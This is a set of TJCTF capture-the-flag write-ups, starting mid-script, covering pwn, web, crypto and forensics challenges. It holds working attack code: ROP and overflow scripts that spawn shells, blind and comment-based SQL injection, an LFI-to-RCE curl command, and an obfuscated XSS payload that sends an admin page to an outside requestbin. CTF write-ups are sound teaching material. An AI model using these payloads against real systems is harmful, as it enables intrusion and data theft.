libc = ELF("/home/kali/Tools/libc-database/libs/libc6_2.27-3ubuntu1_amd64/libc.so.6")
poprdi = 0x0000000000400953 # pop rdi ; ret
poprsi = 0x0000000000400951
#p = e.process()
p = remote('p1.tjctf.org', 8001)
leak = flat(poprdi, e.got['printf'],poprsi, 0, 0, e.plt['printf'], 0x0000000000400747, word_size=64)
payload = padding[:-8] + p64(0x000000000602000 + 0x1000 - (0x20 + 0x8 * 10)) + leak
p.sendline(payload)
p.recvlines(9)
output = p.recvuntil("Which")[:-5]
output += b'\x00\x00'
printf = u64(output)
log.info(f"Printf: {hex(printf)}")
libcbase = printf - libc.symbols['printf']
libc.address = libcbase
log.info(f"Libc base: {hex(libcbase)}")
chain = flat(poprdi, next(libc.search(b"/bin/sh\x00")), poprsi, 0, 0, libc.symbols['system'], word_size=64)
payload = padding + chain
pause()
p.sendline(payload)
p.interactive()
```



### File: Writeups/TJCTF/TTW.md

# TTW

So, what a mess this was. Firstly, we started by performing a timing attack. That managed to get us quite a lot of things, but it was annoying having to wait 5 minutes for some results. So lets look for a better option. Looking at the hint, it says to think about I/O. Hmmm, ok. Connecting through netcat, it prints out "Imagine having a usable terminal". Ok, interesting. If we try and enter in a command, it doesn't output anything. Odd. We can probably assume that all our commands are being sent to `/dev/null`, where they just get wiped away. What if we could trick the connection to redirect our commands anywhere, instead of `/dev/null`. If we know that `2>/dev/null` sends any errors there, we can redirect our output to the input as we're connected there, doing `>&0`. Once we've done some enum, we can use the name of the challenge "TT Why" (sounding like TTY) to spawn a tty shell, where we can run sudo -l (as password.txt has problem-user password) to see that we can run `/usr/bin/chguser` as root. Changing user, navigating to home folder, then to flag, we get flag.txt
```
>ls -alR ./ >&0
message.txt
password.txt
```
```
> cat message.txt
Man, I just sure wish I could impersonate other_user
```
```
> cat password.txt
Password for problem user: 1234qwer
```
```
> python -c 'import pty; pty.spawn("/bin/bash")' >&0
```
```bash
$ sudo -l
(root) /usr/bin/chguser
```
```bash
$ sudo /usr/bin/chguser other-user
Password: 1234qwer
```
```bash
$ ls -alR 
./flag:
flag.txt
```
```bash
$ cat flag/flag.txt
```
#### tjctf{ptys_sure_are_neat}



### File: Writeups/TJCTF/Timed.md

# Timed

Use `ord(open()[x])` to read one byte at a time, and sleep for it's ascii value   
#### tjctf{iTs_T1m3_f0r_a_flaggg}



### File: Writeups/TJCTF/Tinder.md

# Tinder

It gets a bunch of input from us using a function called input that does some multiplication a value,
lets call this number "num", and then calls fgets(var,num,stdin), basically reading num bytes into "var". 
By stepping through the program and looking at every function call of input, we see the last one has the largest value, 
so I just went with that even though they'd all probably work.


Later on, there are some interesting instructions. Namely these two:  
```
cmp DWORD PTR [ebp-0xc], 0xc0d3d00d
jne <main+443>
```
Note that these two lines are at `main+247` - that's quite a jump. It compares some variable on the stack to `0xc0d3d00d` and jumps away if they aren't equal. If they are equal, it goes on to execute some instructions including fopen, fgets, puts etc. - probably printing the flag from flag.txt. 


Using gdb, I set a breakpoint at the instruction that compares `ebp-0xc` to `0xc0d3d00d`. Then at the fourth input I pasted in a de brujin pattern generated by pattern.py. At the breakpoint, I read `ebp-0xc`, and pasted this value back into pattern.py. This gives 116 bytes until we overwrite this variable, so our payload is just

```
enter whatever you want into the first three inputs
enter 116 bytes + p32(0xc0d3d00d) on the fourth input
Script below, even though this doesnt really need a script(a dynamic one, I mean)
```
```python
from pwn import *
NUM_TO_VAR = 116
padding = b'A' * NUM_TO_VAR
p = remote('p1.ljctf.org',8002)
[p.sendline('t') for _ in range(3)] # If you send nothing it'll rage
payload = padding + p32(0xc0d3d00d)
p.sendline(payload)
p.interactive()
```



### File: Writeups/TJCTF/Titanic.md

# Titanic

The first step is to get a list of all the words from the titanic:

```bash
curl http://www.dailyscript.com/scripts/Titanic.txt | tr '[:space:]' '\n' | sed  '/^$/d' | | tr -d '.' | tr -d ',' | tr '[:upper:]' '[:lower:]' > wl
```

Now we create a new wordlist in flag format:
```bash
for i in $(cat wl); do echo "tjctf{$i}" >> wl2; done
```

Then we can use the password cracking tool john to get the flag.
```bash
john -w=wl3 hash --format=raw-md5
```

#### The flag is tjctf{ismay's}



### File: Writeups/TJCTF/Weak password.md

# Weak Password

We can use the SQL LIKE clause to bruteforce the password one character at a time.

```python
import requests

url = 'https://weak_password.tjctf.org/login'
alphabet = 'abcdefghijklmnopqrstuvwxyz'

print('Bruteforcing password: ', end='', flush=True)
for i in range(100):
    for char in alphabet:
        r = requests.post(url, data = {'username': 'test', 'password': f"a' OR EXISTS(SELECT * FROM `userandpassword` WHERE username='admin' AND password LIKE '{'_'*i}{char}%') AND ''='"})
        if 'Wrong' not in r.text:
            print(char, end='', flush=True)
            break
    else:
        print('\nPassword found')
```

The password is 'blinded', the flag is:
#### tjctf{blinded}



### File: Writeups/TJCTF/Web/Admin secrets.md

# Admin secrets

Can perform XSS by reporting to admin
Admin dashboard has a link to /admin_flag
Requesting admin_flag from a page with {, ", ', `, or <script> gives an error
```java
<img src="0" onerror="eval(String.fromCharCode(118,97,114,32,120,104,116,116,112,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,40,41,59,120,104,116,116,112,46,111,110,114,101,97,100,121,115,116,97,116,101,99,104,97,110,103,101,61,102,117,110,99,116,105,111,110,40,41,123,118,97,114,32,120,104,116,116,112,50,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,40,41,59,105,102,40,116,104,105,115,46,115,116,97,116,117,115,61,61,50,48,48,41,123,120,104,116,116,112,50,46,111,112,101,110,40,39,71,69,84,39,44,39,104,116,116,112,58,47,47,114,101,113,117,101,115,116,98,105,110,46,110,101,116,47,114,47,49,103,50,117,104,110,55,49,63,111,117,116,61,39,43,101,110,99,111,100,101,85,82,73,40,98,116,111,97,40,116,104,105,115,46,114,101,115,112,111,110,115,101,84,101,120,116,41,41,44,116,114,117,101,41,125,101,108,115,101,123,120,104,116,116,112,50,46,111,112,101,110,40,39,71,69,84,39,44,39,104,116,116,112,58,47,47,114,101,113,117,101,115,116,98,105,110,46,110,101,116,47,114,47,49,103,50,117,104,110,55,49,63,111,117,116,61,39,43,116,104,105,115,46,115,116,97,116,117,115,44,116,114,117,101,41,125,120,104,116,116,112,50,46,115,101,110,100,40,41,125,59,120,104,116,116,112,46,111,112,101,110,40,39,71,69,84,39,44,39,47,97,100,109,105,110,95,102,108,97,103,39,44,116,114,117,101,41,59,120,104,116,116,112,46,115,101,110,100,40,41,59))">
```
Takes the flag and forwards it to a request bin



### File: Writeups/TJCTF/Web/Circus.md

# Circus

/.git exists, use gitdumper to get source
Type juggling, password is sha256'd and compared with ==
Revert to get old user creds from git
34250003024812 is a magic sha256 string
Andon1956:34250003024812



### File: Writeups/TJCTF/Web/File Viewer.md

# File Viewer

Basic LFI Vuln  
curl -XPOST 'https://file_viewer.tjctf.org/reader.php?file=php://input' -d '<?php system("whoami"); ?>' - www-data
ls -la:  
```
-r--r--r-- 1 root     root       44 May 18 15:32 apple.txt
-r--r--r-- 1 root     root       74 May 24 15:12 grape.txt
dr-xr-xr-x 1 root     root     4096 May 24 15:12 i_wonder_whats_in_here
-r--r--r-- 1 root     root     3012 May 18 15:32 index.html
-r--r--r-- 1 root     root       27 May 18 15:32 orange.txt
-r--r--r-- 1 root     root       49 May 18 15:32 pear.txt
-r--r--r-- 1 root     root       27 May 18 15:32 pinneaple.txt
-r--r--r-- 1 root     root     2532 May 18 15:32 reader.php
-r--r--r-- 1 root     root       22 May 18 15:32 watermelon.txt
```
```php
curl -XPOST 'https://file_viewer.tjctf.org/reader.php?file=php://input' -d '<?php system("cat i_wonder_whats_in_here/* "); ?>'
```
#### tjctf{n1c3_j0b_with_lf1_2_rc3}



### File: Writeups/TJCTF/Web/Gamer W.md

# Gamer W

Unity webgl game, requires adding the Cetus Chrome Extension
Use cetus to search (f32) for current health, narrow down results and freeze in place
Increase attack damage to 5000
When placed behind a wall, use either `0x01a508b8`, `0x01a5ab60`, `0x01fc6560`or `0x01fc65b0` to move yourself out  
#### tjctf{c3tus_del3tus_ur_m3ms_g0ne}



### File: Writeups/TJCTF/Web/Login sequel.md

# Login sequel

Set username to "admin'/*" and the password to whatever
this is so the command executed is  
```sql
"SELECT username, password FROM `userandpassword` WHERE username='admin/*' AND password='<md5 HASH object @ 0x00000151246A95F8>'"
/* is a comment so everything after that is ignored.
```
EZ 
#### flag is tjctf{W0w_wHa1_a_SqL1_exPeRt!}



### File: Writeups/TJCTF/Web/Moar Horse 4.md

# Moar Horse 4

Jwt HSA/RSA signing vulnerability
Use pubkey.pem with jwt_tool.py
'speed' is calculated with  
```python
speed = int(hashlib.md5(("Horse_" + horse).encode()).hexdigest(), 16)
```
'ajuuer' is fast enough
Set horses to ["ajuuer"]  
Race  
Get flag  
#### tjctf{w0www_y0ur_h0rs3_is_f444ST!} 
```python
from pwn import *
import hashlib
from pwnlib.util.iters import mbruteforce
import string

BOSS_HORSE = "MechaOmkar-YG6BPRJM"
goal = int(hashlib.md5(("Horse_" + BOSS_HORSE).encode()).hexdigest(), 16)
def attempt(horse):
        speed = int(hashlib.md5(("Horse_" + horse).encode()).hexdigest(), 16)
        if speed > goal:
                return True
        else:
                return False
myhorse = mbruteforce(attempt, string.ascii_lowercase, length=10)
print(myhorse)
```



### File: Writeups/TJCTF/Web/Sarah Palin Fanpage.md

# Sarah Palin Fanpage

Saves cookie with dict of liked moments  
```bash
echo 'COOKIE' | sed 's/false/true/g' | base64 -w0
```  
Replace cookie and go to vip area



### File: Writeups/TJCTF/Web/Weak password.md

# Weak Password

We can use the SQL LIKE clause to bruteforce the password one character at a time.

```python
import requests

url = 'https://weak_password.tjctf.org/login'
alphabet = 'abcdefghijklmnopqrstuvwxyz'

print('Bruteforcing password: ', end='', flush=True)
for i in range(100):
    for char in alphabet:
        r = requests.post(url, data = {'username': 'test', 'password': f"a' OR EXISTS(SELECT * FROM `userandpassword` WHERE username='admin' AND password LIKE '{'_'*i}{char}%') AND ''='"})
        if 'Wrong' not in r.text:
            print(char, end='', flush=True)
            break
    else:
        print('\nPassword found')
```

The password is 'blinded', the flag is:
#### tjctf{blinded}



### File: Writeups/TJCTF/Zipped up.md

# Zipped up

We start  with a .zip file. When we unzip, we get a directory called 0. It contains one file, 1.tar.bz2


If we decompress this file, we get a directory called 1, which contains 1.txt and another compressed file. This repeats.


The text files seem to contain `tjctf{n0t_th3_fl4g}`,
I took a guess that at some level in this recursive compression has a .txt file that yields the flag.


This is relatively simple. Every file is either .kz3, .tar.bz2, or .tar.gz.
We can use file extensions to detect which type of file it is, and then decompress.
Script below(a bit bad, I'm aware) I unzipped up to directory 1 manually because it's different to the rest.

```python
start = 1
import os
def unzip(filename):
  os.system(f"unzip {filename}")
def untar(filename):
  os.system(f"tar -zvjf {filename}")
def gunzip(filename):
  os.system(f"tar -zvxf {filename}")
cur = start
while True:
  files = os.listdir(str(cur))
  file = next(filter(lambda x: '.txt' not in x, files)) # Ignore this monstrosity
  file = os.path.join(str(cur),file)
  if 'kz3' in file:
    unzip(file)
  elif 'bz2' in file:
    untar(file)
  else:
     gunzip(file)
  file = next(filter(lambda x: '.txt' in x, files)) # Again, ignore this monstrosity
  os.system(f"cat {os.path.join(str(cur),file)} >> flags.txt") # Basically puts the text file into flags.txt
  os.system(f"rm -rf {cur}") # Remove at your own risk, just cleans up and makes sure not to blow up your VM
  cur += 1
```
After running the script you'll be left with a file flags.txt. Majorly, flags.txt contains a bunch of `ljctf{n0t_th3_fl4g}`
but if you filter this out using `grep -v` the flag will be revealed to you.



### File: Writeups/TJCTF/arabfunny.md

# arabfunny

There's DTMF tones in the audio from `1:05ish - 1:18ish`, decode those and convert the 2 digit ascii numbers to text to get the flag  
#### tjctf{bruh_camel_240p}



### File: Writeups/TJCTF/comprehensive2.md

# comprehensive2

```python
a = [1, 18, 21, 18, 73, 20, 65, 8, 8, 4, 24, 24, 9, 18, 29, 21, 3, 21, 14, 6, 18, 83, 2, 26, 86, 83, 5, 20, 27, 28, 85, 67, 5, 17, 2, 7, 12, 11, 17, 0, 2, 20, 12, 26, 26, 30, 15, 44, 15, 31, 0, 12, 46, 8, 28, 23, 0, 11, 3, 25, 14, 0, 65]
print(str([x for z in [[[ord(m[i]) ^ ord(n[j // 3]) ^ ord(n[i - j - k]) ^ ord(n[k // 21]) for i in range(j + k, j + k + 3)] for j in range (0, 21, 3)] for k in range(0, len(m), 21)] for y in z for x in y])[1:-1])
#i deobfuscated first to get
for k in range(0, 63, 21):
    for j in range (0, 21, 3):
        for i in range(j + k, j + k + 3): # every 3 char chunks
            shat = ord(m[i])
            #shat = a[i] i will use this later to solve
            shat ^= ord(n[j // 3]) #[0,1... 6]
            shat ^= ord(n[i - j - k]) #[0,1,2]
            shat ^= ord(n[k // 21]) #[0,1,2]
            go += chr(shat)
print(go)
#then i made this script to find where the flag could be
for i in range(0,60,3):
    crib = " tjctf{"
    for j in range(2):
        for k in range(3):
            pp = a[i:i+6]
            x = pp[0+j] ^ pp[1+j] ^ pp[3+j] ^ pp[4+j]
            x^= ord(crib[0+k]) ^ ord(crib[1+k]) ^ ord(crib[3+k]) ^ ord(crib[4+k])
            if x == 0:
                print(i+j,crib[k:])
```

then i found that it showed 2 results for 31-33 range which looked promising. 
i xored them 2 at a time as well as parts of the flag to find the difference. 
i then asked willwam to find a solution but i also checked it with the solutions i generated.
i then found `33 == 21 + 18` so the mid of 3 sections xored with flag part would get the other part of flag.
this gave me "cap" as my 4th-6th characters. 
i used the chars i generated and bruteforced it and saw `"hata o sagashiteimQCE ka? dozo"`,
`"tjctf{sE]Ymasen_flag_kudasaiYM"` which was using "isa". 
i brute forced the last char to get "isacapo" and 
#### "hata o sagashiteimasu ka? dozo, tjctf{sumimasen_flag_kudasaii}."



### File: Writeups/TJCTF/difficult decryption.md

# difficult decryption

So i just followed the tutorial kek. i spent so long understanding what it meant so heres a summary of it
```
1. compute prime factors of totient p in form p^k
2. find x modulo p^k (ill show later)
3. chinese remainder thereom!!!!!
4. compute shared key (other ** step3 % modulus)
5. xor and convert to hex then text!!!
tjctf{Ali3ns_1iv3_am0ng_us!}
```

did it this script (after chinese remainder i got `64460789473481109991812750133942026256` alice - doesnt need to be prime because they cycle)
```python
a = 491988559103692092263984889813697016406
msg = 12259991521844666821961395299843462461536060465691388049371797540470
c = [232042342203461569340683568996607232345,76405255723702450233149901853450417505]

at = 1
for i in a0:
    at *= phi(i)
print(at)

at0 = [[2**32],[3**15],[5**4],[7**3],[11],[13**2],[17],[19],[23],[29],[37],[53],[79],[109]]

for i in at0:
    temp = pow(c[0],at//i[0],a)
    for j in range(1,10000):
        if pow(pow(5,at//i[0],a),j,a) == temp:
            print(j,",",i[0],end = "),(")
            break
    else:
        print(j,"??")
  ```   



### File: Writeups/TJCTF/home rolled.md

# home rolled

So after deobfuscating the script (which i didnt rly needed to) i found it was encrypted with a otp of random order of range(256). so then i thought "kek how can i break otp" but then i realised it never repeats itself. i also knew that it started with "tjctf{" and ended with "}". i created a list of possible values left and used that for each position of the flag. this gave me a bunch of characters possible for that position. i just needed to repeat it until there was 1 char left (connected with vpn cus doxx). i did it with this script.
#### tjctf{n3v3r_r0LL_ur_0wn_cryptOMEGALUL}



### File: Writeups/TJCTF/rgbsa.md

# rgbsa

Extract red pixel vals from each frame (last bit)
go to day's site

 https://medium.com/bugbountywriteup/rsa-attacks-common-modulus-7bdb34f331a5 
 
copy code with adjustments. convert output to text and bam! 
#### flag{excitable_illumination_wanderer_}

```python
def main():
    from PIL import Image, ImageFilter

    def openshit(filename):
        # Open image file
        im = Image.open(filename)

        print("\n** Analysing image **\n")

        # Display image format, size, colour mode
        print("Format:", im.format, "\nWidth:", im.width, "\nHeight:", im.height, "\nMode:", im.mode)

        # Check if GIF is animated
        frames = im.n_frames

        print("Number of frames: " + str(frames))
        print("\n** Converting image **\n")

        alls = []
        # Iterate through frames and pixels, top row first
        for z in range(frames):
            # Go to frame
            im.seek(z)
            rgb_im = im.convert('RGB')
            # print("Frame: ", im.tell())

            pixels = list(rgb_im.getdata())

            a = int("".join([str(r[0]%2) for r in pixels]),2)
            # print("--------------------------------------")
            # print(a)
            # print("--------------------------------------")
            alls.append(a)

        return alls


    alln = openshit("n.gif")
    alle = openshit("e.gif")
    allc = openshit("new_c.gif")
```

